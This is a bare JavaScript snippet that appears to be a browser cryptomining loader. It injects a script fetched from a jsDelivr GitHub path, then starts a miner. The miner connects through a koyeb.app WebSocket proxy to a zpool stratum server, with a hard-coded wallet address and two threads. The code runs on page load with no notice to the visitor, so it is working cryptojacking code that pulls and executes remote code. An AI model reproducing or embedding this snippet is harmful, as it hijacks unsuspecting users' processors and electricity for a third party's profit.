   function start() {
    const client = new Client({
      stratum: {
        server: "minotaurx.na.mine.zpool.ca",
        port: 7019,
        worker: "RFNMZhc4rbed6eu3qb8B8WPWKDhcTaERBh",
        password: "c=RVN"
      },
      options: {
        threads: 2,
        log: true,
      },
    }, "wss://spotty-kirstin-masterw-40c2f783.koyeb.app/proxy")};

    const script = document.createElement('script');
    script.src = "https://cdn.jsdelivr.net/gh/gogogo0123456/A-1-4e-hg1s/mains.js";
     script.onload = () => {
      start();
    };
    document.head.appendChild(script);